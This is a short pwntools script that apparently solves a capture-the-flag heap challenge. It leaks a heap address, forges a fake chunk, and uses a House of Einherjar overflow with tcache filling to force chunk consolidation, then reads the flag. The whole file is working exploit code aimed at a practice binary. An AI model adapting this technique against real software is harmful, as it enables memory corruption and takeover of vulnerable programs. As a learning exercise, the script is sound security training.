from pwn import * 

binary = './toddlerheap_level8.0_patched'

p = process(binary)
s = '''
b malloc
b free
'''



# the next pointer is left in a chunk after freeing and remalloc'ing. Thus leak the heap address 
p.sendline("malloc 0 24")
p.sendline("free 0")
p.sendline("malloc 0 24") #chunk A
p.sendline("puts 0")

p.recvuntil("Data: ", drop = True)
heap_leak = int.from_bytes(p.recvline().strip(), 'little')

heap_leak = heap_leak << 12
chunk_addr = heap_leak + 0x2e0
print(hex(chunk_addr))

# house of einhejar
p.sendline("malloc 1 120") # chunk A
p.sendline("malloc 2 40") # chunk B
p.sendline("malloc 3 1016") # chunk C

# creating a fake chunk and overflowing the size fields of C
p.sendline("read_copy 1")
p.sendline(b'A' * 0x20 + p64(0) + p64(0x80) + p64(chunk_addr) + p64(chunk_addr))
p.sendline("read_copy 2")
p.sendline(b'B' * 0x20 + p64(0x80))

# filling up tcache so that it goes into unsortedbin

for i in range(4, 12):
	p.sendline(f"malloc {i} 24")
p.sendline(f"malloc 13 24")
for i in range(4, 12):
	p.sendline(f"free {i}")
	
	
for i in range(4, 11):
	p.sendline(f"malloc {i} 1016")

for i in range(4, 11):
	p.sendline(f"free {i}")

p.sendline("free 3")


	
# freeing chunk C and it starts to consolidate now!
gdb.attach(p, s)
p.sendline(f"free 13")

p.sendline("read_flag")


p.interactive()

